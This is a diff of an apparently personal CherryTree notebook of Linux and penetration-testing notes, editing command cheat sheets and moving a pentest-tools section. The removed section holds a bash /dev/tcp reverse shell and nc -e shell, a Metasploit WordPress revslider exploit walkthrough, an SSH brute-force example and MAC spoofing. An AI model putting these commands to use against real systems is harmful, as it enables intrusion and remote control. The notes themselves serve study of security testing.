 stat (3type)         - file status
 </rich_text>
       </node>
-      <node name="su" unique_id="162" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285469" ts_lastsave="1685330533">
-        <rich_text>su &lt;newuser&gt;		# switch user
-su - &lt;username&gt;		# switch user</rich_text>
+      <node name="su" unique_id="162" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285469" ts_lastsave="1730265418">
+        <rich_text scale="h1" weight="heavy">su</rich_text>
+        <rich_text>
+su or switch-user
+su (1)              - run a command with substitute user and group ID
+
+
+su &lt;newuser&gt;		# switch user
+su - &lt;username&gt;		# switch user
+</rich_text>
       </node>
-      <node name="sudo" unique_id="161" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285466" ts_lastsave="1685330478">
-        <rich_text>sudo -u &lt;username&gt; x  # run command as this user
-sudo -u nobody zsh
+      <node name="sudo" unique_id="161" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285466" ts_lastsave="1730276636">
+        <rich_text scale="h1" weight="heavy">sudo</rich_text>
+        <rich_text>
+sudo (8)             - execute a command as another user
 
-sudo -l  # see privilages
+</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4">$ </rich_text>
+        <rich_text foreground="#2e2ec2c27e7e">sudo</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4"> command</rich_text>
+        <rich_text foreground="#5757e3e38989">	</rich_text>
+        <rich_text>				</rich_text>
+        <rich_text foreground="#c0c0bfbfbcbc"># run command as root'</rich_text>
+        <rich_text>
 
-sudo su - &lt;username&gt;
-sudo su - marlinspike</rich_text>
+</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4">$ </rich_text>
+        <rich_text foreground="#2e2ec2c27e7e">sudo</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4"> -u </rich_text>
+        <rich_text>&lt;username&gt; command  	</rich_text>
+        <rich_text foreground="#c0c0bfbfbcbc"># run command as this user</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4">$ </rich_text>
+        <rich_text foreground="#2e2ec2c27e7e">sudo</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4"> -u </rich_text>
+        <rich_text>admin /bin/bash
+
+</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4">$ </rich_text>
+        <rich_text foreground="#2e2ec2c27e7e">sudo</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4"> -l</rich_text>
+        <rich_text>  						</rich_text>
+        <rich_text foreground="#c0c0bfbfbcbc"># see privilages of curent user</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4">$ </rich_text>
+        <rich_text foreground="#2e2ec2c27e7e">sudo</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4"> su -</rich_text>
+        <rich_text> &lt;username&gt;			
+</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4">$ </rich_text>
+        <rich_text foreground="#2e2ec2c27e7e">sudo</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4"> su - </rich_text>
+        <rich_text>admin</rich_text>
+        <rich_text foreground="#9a9a99999696">
+</rich_text>
+        <rich_text>
+(Reminder: Swich user with "</rich_text>
+        <rich_text weight="heavy">su</rich_text>
+        <rich_text>" command)
+</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4">$ </rich_text>
+        <rich_text foreground="#2e2ec2c27e7e">su</rich_text>
+        <rich_text foreground="#8f8ff0f0a4a4"> - &lt;usename&gt;</rich_text>
       </node>
       <node name="systemctl" unique_id="168" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285501" ts_lastsave="1716696147">
         <rich_text>systemctl &lt;option&gt; &lt;servicename.service&gt;
@@ -6162,8 +6742,12 @@ options:
 servicename:
 	bluetooth -&gt; bluetooth.service</rich_text>
       </node>
-      <node name="tac" unique_id="102" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285104" ts_lastsave="1695267894">
-        <rich_text>cat (1)              - </rich_text>
+      <node name="tac" unique_id="102" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285104" ts_lastsave="1730264788">
+        <rich_text scale="h1" weight="heavy">tac</rich_text>
+        <rich_text>
+tac &gt; cat
+
+cat (1)              - </rich_text>
         <rich_text foreground="#6262a0a0eaea">concatenate</rich_text>
         <rich_text> files and print on the </rich_text>
         <rich_text foreground="#2e2ec2c27e7e">standard</rich_text>
@@ -6175,16 +6759,21 @@ tac (1)              - </rich_text>
         <rich_text>
 
 
-cat &gt; tac
-
 cat : top to bottom
-tac : bottom to top</rich_text>
+tac : bottom to top
+
+
+see:
+more, less, head, tail</rich_text>
       </node>
-      <node name="tail" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285118" ts_lastsave="1685695844">
+      <node name="tail" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285118" ts_lastsave="1730264616">
         <rich_text>tail &gt; head
 
 tail -n 10  # 10 last lines
-tail -c 10  # 10 lash chars</rich_text>
+tail -c 10  # 10 lash chars
+
+see:
+more, less, cat, tac</rich_text>
       </node>
       <node name="tar" unique_id="136" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285284" ts_lastsave="1684285288"/>
       <node name="tcpdump" unique_id="38" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283981" ts_lastsave="1695267925">
@@ -6685,64 +7274,112 @@ stat (3type)			- file status
 cat (1)					- concatenate files and print on the standard output
 </rich_text>
     </node>
-    <node name="Help" unique_id="286" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="243" is_bold="0" foreground="" ts_creation="1695268960" ts_lastsave="1728277666">
+    <node name="Help" unique_id="286" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="243" is_bold="0" foreground="" ts_creation="1695268960" ts_lastsave="1730277363">
       <rich_text scale="h1" weight="heavy">Commands Help</rich_text>
       <rich_text>
 
 </rich_text>
-      <rich_text scale="h3" weight="heavy"># Commands</rich_text>
-      <rich_text>
-</rich_text>
-      <rich_text foreground="#35358484e4e4">man
-whatis
-apropose
-type
-whereis
-which</rich_text>
+      <rich_text scale="h2" foreground="#ffffbebe6f6f" weight="heavy"># Help for Commands</rich_text>
       <rich_text>
 
+• Command Manual and Information
 </rich_text>
-      <rich_text scale="h3" weight="heavy"># Help option</rich_text>
+      <rich_text foreground="#35358484e4e4">man</rich_text>
+      <rich_text foreground="#9999c1c1f1f1"> </rich_text>
+      <rich_text foreground="#dcdc8a8adddd">&lt;command&gt;</rich_text>
+      <rich_text foreground="#35358484e4e4">
+whatis</rich_text>
+      <rich_text foreground="#dcdc8a8adddd"> &lt;command&gt;</rich_text>
+      <rich_text foreground="#35358484e4e4">
+
+</rich_text>
+      <rich_text>• Search for Manual Page
+</rich_text>
+      <rich_text foreground="#35358484e4e4">apropose</rich_text>
+      <rich_text foreground="#dcdc8a8adddd"> &lt;command&gt;</rich_text>
+      <rich_text foreground="#35358484e4e4">
+
+</rich_text>
+      <rich_text>• Locate Command Origin Address</rich_text>
+      <rich_text foreground="#35358484e4e4">
+type</rich_text>
+      <rich_text foreground="#dcdc8a8adddd"> &lt;command&gt;</rich_text>
+      <rich_text foreground="#35358484e4e4">
+whereis</rich_text>
+      <rich_text foreground="#dcdc8a8adddd"> &lt;command&gt;</rich_text>
+      <rich_text foreground="#35358484e4e4">
+which</rich_text>
+      <rich_text foreground="#dcdc8a8adddd"> &lt;command&gt;</rich_text>
       <rich_text>
-&lt;command&gt; </rich_text>
+
+
+</rich_text>
+      <rich_text scale="h2" foreground="#ffffbebe6f6f" weight="heavy"># Help option</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text foreground="#dcdc8a8adddd">&lt;command&gt;</rich_text>
+      <rich_text> </rich_text>
       <rich_text foreground="#35358484e4e4">-h</rich_text>
       <rich_text>
-&lt;command&gt; </rich_text>
+</rich_text>
+      <rich_text foreground="#dcdc8a8adddd">&lt;command&gt; </rich_text>
       <rich_text foreground="#35358484e4e4">--help</rich_text>
       <rich_text>
 
 </rich_text>
-      <rich_text scale="h3" foreground="#5757e3e38989" weight="heavy"># Google IT!</rich_text>
-      <rich_text>
-</rich_text>
+      <rich_text scale="h2" foreground="#c6c646460000" weight="heavy"># Google IT!</rich_text>
+      <rich_text> (</rich_text>
+      <rich_text foreground="#ffffbebe6f6f" weight="heavy">Final solution</rich_text>
+      <rich_text>)
+Google			:	</rich_text>
       <rich_text link="webs http://www.google.com">www.google.com</rich_text>
       <rich_text>
-</rich_text>
+OverStakFlow	:	</rich_text>
       <rich_text link="webs http://www.overstakflow.com">www.overstakflow.com</rich_text>
       <rich_text>
-</rich_text>
+GitHub			:	</rich_text>
       <rich_text link="webs http://www.github.com">www.github.com</rich_text>
       <rich_text>
 </rich_text>
     </node>
-    <node name="System Info" unique_id="283" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="133" is_bold="0" foreground="" ts_creation="1695265840" ts_lastsave="1729830276">
+    <node name="System Info" unique_id="283" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="133" is_bold="0" foreground="" ts_creation="1695265840" ts_lastsave="1730277416">
       <rich_text scale="h1" weight="heavy">System information Commands</rich_text>
       <rich_text>
 
+
+• User and System info
 </rich_text>
       <rich_text foreground="#35358484e4e4">uname
 hostname
 hostnamectl
-whoami
-who
-env
-w
-last
-users
+</rich_text>
+      <rich_text>
+• Curent User info
+</rich_text>
+      <rich_text foreground="#35358484e4e4">whoami
+sudo -l
 id
+</rich_text>
+      <rich_text>
+• Offline/Online Users
+</rich_text>
+      <rich_text foreground="#35358484e4e4">w
+who
+users
+last
+</rich_text>
+      <rich_text>
+• More
+</rich_text>
+      <rich_text foreground="#35358484e4e4">ps</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text foreground="#35358484e4e4">env
 journalctl
 xrandr
 neofetch</rich_text>
+      <rich_text>
+</rich_text>
     </node>
   </node>
   <node name="Path" unique_id="246" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="230" is_bold="0" foreground="" ts_creation="1685431737" ts_lastsave="1730250183">
@@ -7062,12 +7699,15 @@ This is a command-line hack that acts as a vacuum, that sucks anything thrown to
         <rich_text>
 </rich_text>
       </node>
-      <node name="var" unique_id="402" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1729449822" ts_lastsave="1729450038">
+      <node name="var" unique_id="402" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1729449822" ts_lastsave="1730277551">
         <rich_text scale="h1" weight="heavy">/var</rich_text>
         <rich_text>
 
-In Linux, /var is a standard directory that stands for "variable files".
+</rich_text>
+        <rich_text foreground="#f6f6d3d32d2d">In Linux, /var is a standard directory that stands for "variable files".
 As the name suggests, this directory contains data that changes frequently while the system is running.</rich_text>
+        <rich_text>
+</rich_text>
       </node>
     </node>
     <node name="Wordlists" unique_id="405" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1730105640" ts_lastsave="1730107218">
@@ -7830,11 +8470,11 @@ Description: Speedy, parallel, and modular brute-force log-in tool.
 Example: medusa -h example.com -u user -P passlist.txt -M ssh
 </rich_text>
     </node>
-    <node name="Most used" unique_id="305" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="50" is_bold="0" foreground="" ts_creation="1718597538" ts_lastsave="1730247020">
-      <rich_text scale="h1">Most used command for </rich_text>
-      <rich_text scale="h1" foreground="#ffffbebe6f6f" weight="heavy">Penetration</rich_text>
-      <rich_text scale="h1"> or </rich_text>
-      <rich_text scale="h1" foreground="#ffffbebe6f6f" weight="heavy">Pen-testing</rich_text>
+    <node name="Most used" unique_id="305" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="50" is_bold="0" foreground="" ts_creation="1718597538" ts_lastsave="1730278640">
+      <rich_text scale="h1" weight="heavy">Most used command for </rich_text>
+      <rich_text style="italic" scale="h1" foreground="#ffffbebe6f6f" weight="heavy">Penetration</rich_text>
+      <rich_text scale="h1" weight="heavy">/</rich_text>
+      <rich_text style="italic" scale="h1" foreground="#ffffbebe6f6f" weight="heavy">Pen-testing</rich_text>
       <rich_text>
 </rich_text>
       <rich_text scale="h3">Searching for vulnerabilities</rich_text>
@@ -7995,199 +8635,6 @@ zenmap									...					</rich_text>
         <rich_text scale="h1" weight="heavy">• Others</rich_text>
         <rich_text>	----------------------------------------------------
 Wappalyzer (Browser Plugin)</rich_text>
-      </node>
-      <node name="Commands" unique_id="170" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285666" ts_lastsave="1729196384">
-        <rich_text scale="h1" weight="heavy">More Penetration Commands</rich_text>
-        <rich_text> (Most Used)</rich_text>
-        <node name="arachni" unique_id="241" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684530690" ts_lastsave="1694326232">
-          <rich_text>Download Page:
-</rich_text>
-          <rich_text link="webs https://www.arachni-scanner.com/download/">https://www.arachni-scanner.com/download/</rich_text>
-          <rich_text>
-
-Linux Download link:
-</rich_text>
-          <rich_text link="webs https://objects.githubusercontent.com/github-production-release-asset-2e65be/861781/858de0ed-8b61-4bf0-a354-fa40fa590006?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230519%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20230519T205347Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=ca5d22a8a5f560edbe65936446e078369b0ab29e9a49d7970bead40ad33e1dc5&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=861781&amp;response-content-disposition=attachment%3B%20filename%3Darachni-1.6.1.3-0.6.1.1-linux-x86_64.tar.gz&amp;response-content-type=application%2Foctet-stream">https://objects.githubusercontent.com/github-production-release-asset-2e65be/861781/858de0ed-8b61-4bf0-a354-fa40fa590006?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230519%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20230519T205347Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=ca5d22a8a5f560edbe65936446e078369b0ab29e9a49d7970bead40ad33e1dc5&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=861781&amp;response-content-disposition=attachment%3B%20filename%3Darachni-1.6.1.3-0.6.1.1-linux-x86_64.tar.gz&amp;response-content-type=application%2Foctet-stream</rich_text>
-        </node>
-        <node name="arp" unique_id="172" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285702" ts_lastsave="1694147890">
-          <rich_text>Usage:
-  arp [-vn]  [&lt;HW&gt;] [-i &lt;if&gt;] [-a] [&lt;hostname&gt;]             &lt;-Display ARP cache
-  arp [-v]          [-i &lt;if&gt;] -d  &lt;host&gt; [pub]               &lt;-Delete ARP entry
-  arp [-vnD] [&lt;HW&gt;] [-i &lt;if&gt;] -f  [&lt;filename&gt;]            &lt;-Add entry from file
-  arp [-v]   [&lt;HW&gt;] [-i &lt;if&gt;] -s  &lt;host&gt; &lt;hwaddr&gt; [temp]            &lt;-Add entry
-  arp [-v]   [&lt;HW&gt;] [-i &lt;if&gt;] -Ds &lt;host&gt; &lt;if&gt; [netmask &lt;nm&gt;] pub          &lt;-''-
-
-        -a                       display (all) hosts in alternative (BSD) style
-        -e                       display (all) hosts in default (Linux) style
-
-        -s, --set                set a new ARP entry
-        -d, --delete             delete a specified entry
-
-        -v, --verbose            be verbose
-
-        -n, --numeric            don't resolve names
-        -i, --device             specify network interface (e.g. eth0)
-        -D, --use-device         read &lt;hwaddr&gt; from given device
-        -A, -p, --protocol       specify protocol family
-        -f, --file               read new entries from file or from /etc/ethers
-
-
-
-
-Ex:
-$ arp -va
-$ arp -ve
-$ arp -vn
-$ arp -v -i &lt;&lt;eth0&gt;&gt;</rich_text>
-        </node>
-        <node name="arp-scan" unique_id="171" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285689" ts_lastsave="1694326235"/>
-        <node name="dig" unique_id="203" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286089" ts_lastsave="1684286104"/>
-        <node name="dirb" unique_id="176" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285726" ts_lastsave="1684285731"/>
-        <node name="dirbuster" unique_id="177" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285731" ts_lastsave="1684285738"/>
-        <node name="dirsearch" unique_id="196" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285975" ts_lastsave="1684285975"/>
-        <node name="enum4linux" unique_id="183" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285785" ts_lastsave="1684285801"/>
-        <node name="fping" unique_id="211" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286205" ts_lastsave="1684286212"/>
-        <node name="gobuster" unique_id="178" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285738" ts_lastsave="1684285753"/>
-        <node name="hostname" unique_id="204" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286104" ts_lastsave="1684286514">
-          <rich_text>hostname
-hostnamectl</rich_text>
-        </node>
-        <node name="ifconfig" unique_id="191" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285877" ts_lastsave="1694323928">
-          <rich_text>ifconfig -a
-ifconfig wlan0 down; macchanger wlan0 -a; ifconfig wlan0 up;
-</rich_text>
-        </node>
-        <node name="ip" unique_id="192" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285885" ts_lastsave="1694595707">
-          <rich_text foreground="#18b2b2">ip</rich_text>
-          <rich_text> a .. address
-</rich_text>
-          <rich_text foreground="#18b2b2">ip</rich_text>
-          <rich_text> netconf
-</rich_text>
-          <rich_text foreground="#18b2b2">ip</rich_text>
-          <rich_text> link 
-</rich_text>
-          <rich_text foreground="#18b2b2">ip</rich_text>
-          <rich_text> addrlabel
- 
-</rich_text>
-          <node name="info" unique_id="281" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694595660" ts_lastsave="1694595781">
-            <rich_text foreground="#5454ff" weight="heavy">$</rich_text>
-            <rich_text> </rich_text>
-            <rich_text foreground="#18b2b2">ip</rich_text>
-            <rich_text> </rich_text>
-            <rich_text foreground="#18b218">-h</rich_text>
-            <rich_text>
-Usage: ip [ OPTIONS ] OBJECT { COMMAND | help }
-       ip [ -force ] -batch filename
-
-where  OBJECT := { address | addrlabel | amt | fou | help | ila | ioam | l2tp |
-                   link | macsec | maddress | monitor | mptcp | mroute | mrule |
-                   neighbor | neighbour | netconf | netns | nexthop | ntable |
-                   ntbl | route | rule | sr | tap | tcpmetrics |
-                   token | tunnel | tuntap | vrf | xfrm }
- 
-       OPTIONS := { -V[ersion] | -s[tatistics] | -d[etails] | -r[esolve] |
-                    -h[uman-readable] | -iec | -j[son] | -p[retty] |
-                    -f[amily] { inet | inet6 | mpls | bridge | link } |
-                    -4 | -6 | -M | -B | -0 |
-                    -l[oops] { maximum-addr-flush-attempts } | -br[ief] |
-                    -o[neline] | -t[imestamp] | -ts[hort] | -b[atch] [filename] |
-                    -rc[vbuf] [size] | -n[etns] name | -N[umeric] | -a[ll] |
-
-
-
-</rich_text>
-            <rich_text foreground="#5454ff" weight="heavy">$</rich_text>
-            <rich_text> </rich_text>
-            <rich_text foreground="#18b2b2">whatis</rich_text>
-            <rich_text> ip
-ip (7)               - Linux IPv4 protocol implementation 
-ip (8)               - show / manipulate routing, network devices, interfaces and tunnels
- </rich_text>
-          </node>
-        </node>
-        <node name="macchanger" unique_id="199" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286013" ts_lastsave="1694324254">
-          <rich_text>macchanger -s eth0  # -s --show
-macchanger -a eth0  # another kind
-macchanger -r eth0  # fully random</rich_text>
-        </node>
-        <node name="msfconsole" unique_id="194" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285913" ts_lastsave="1685347989">
-          <rich_text>searchsploit &lt;ANYTHING&gt;
-
-search &lt;ANYTHING&gt;
-
-use &lt;X&gt;
-set &lt;X&gt;
-
-show options
-
-set rhost &lt;IP&gt;
-set rhosts &lt;IP&gt;
-
-setg rhost &lt;IP&gt;
-setg rhosts &lt;IP&gt;
-
-show payload
-set payload &lt;X&gt;
-
-
-Example:
-1. $ search revslider
-2. $ use exploit/unix/webapp/wp_revslider_upload_execute
-3. $ show options
-4. $ set rhost 127.0.0.1/targetsiteurl.com
-5. $ set targeturi /wordpress
-6. $ set payload php/meterpreter/bind_tcp
-7. $ show options
-8. $ check
-9. $ exploit (or -&gt; $ run)
-</rich_text>
-        </node>
-        <node name="nbtscan" unique_id="215" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286439" ts_lastsave="1694573845">
-          <rich_text>nbtscan 192.168.90.135/24
-</rich_text>
-        </node>
-        <node name="ncrack" unique_id="213" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286332" ts_lastsave="1684286332"/>
-        <node name="nessus" unique_id="181" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285772" ts_lastsave="1684285776"/>
-        <node name="netcat" unique_id="209" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286180" ts_lastsave="1686252765">
-          <rich_text>Host Machine:
-nc -lnv -s 192.168.90.129 -p 4444
-
-Target Box:
-bash -i &gt;&amp; /dev/tcp/192.168.56.1/4444 0&gt;&amp;1
-
-or use nc again
-nc 192.168.90.128 4444 -e /bin/bash</rich_text>
-        </node>
-        <node name="netdiscover" unique_id="179" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285753" ts_lastsave="1684285767"/>
-        <node name="netstat" unique_id="207" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286149" ts_lastsave="1684286166"/>
-        <node name="nikto" unique_id="175" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285721" ts_lastsave="1694326313">
-          <rich_text>nikto -h 192.168.31.1</rich_text>
-        </node>
-        <node name="nmap" unique_id="174" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285717" ts_lastsave="1696639005"/>
-        <node name="nmapsi4" unique_id="287" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696639005" ts_lastsave="1696639005"/>
-        <node name="nmcli" unique_id="184" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285801" ts_lastsave="1684285801"/>
-        <node name="nslookup" unique_id="208" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286166" ts_lastsave="1684286180"/>
-        <node name="owasp" unique_id="180" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285767" ts_lastsave="1684285772"/>
-        <node name="patator" unique_id="195" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285961" ts_lastsave="1684285975"/>
-        <node name="ping" unique_id="210" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286201" ts_lastsave="1684286205"/>
-        <node name="proxychains" unique_id="200" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286022" ts_lastsave="1684286027"/>
-        <node name="python" unique_id="243" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685336868" ts_lastsave="1728545859">
-          <rich_text>python -c ‘from time import time as t;print(t())’</rich_text>
-        </node>
-        <node name="route" unique_id="190" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285872" ts_lastsave="1684285877"/>
-        <node name="searchsploit" unique_id="193" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285904" ts_lastsave="1684287412">
-          <rich_text>searchsploit xxx
-searchsploit -p 0000
-gcc -o openfuck OpenFuck.c -lcrypto</rich_text>
-        </node>
-        <node name="smbclient" unique_id="227" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684287313" ts_lastsave="1684287313"/>
-        <node name="sqlmap" unique_id="240" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684529801" ts_lastsave="1684529801"/>
-        <node name="traceroute" unique_id="212" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286212" ts_lastsave="1684286212"/>
-        <node name="wapiti" unique_id="237" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684529739" ts_lastsave="1684529739"/>
-        <node name="whatweb" unique_id="352" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1725161979" ts_lastsave="1725161979"/>
-        <node name="whois" unique_id="201" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286071" ts_lastsave="1718594701"/>
       </node>
       <node name="HowTo" unique_id="407" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1730247020" ts_lastsave="1730249943">
         <rich_text scale="h1" foreground="#8f8ff0f0a4a4" weight="heavy">HowTo: Comprehensive Penetration Testing Guide</rich_text>
@@ -8387,11 +8834,203 @@ logrotate -f /etc/logrotate.conf                  # Force log rotation to remove
         <rich_text>
 </rich_text>
       </node>
+      <node name="Commands" unique_id="170" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285666" ts_lastsave="1730250908">
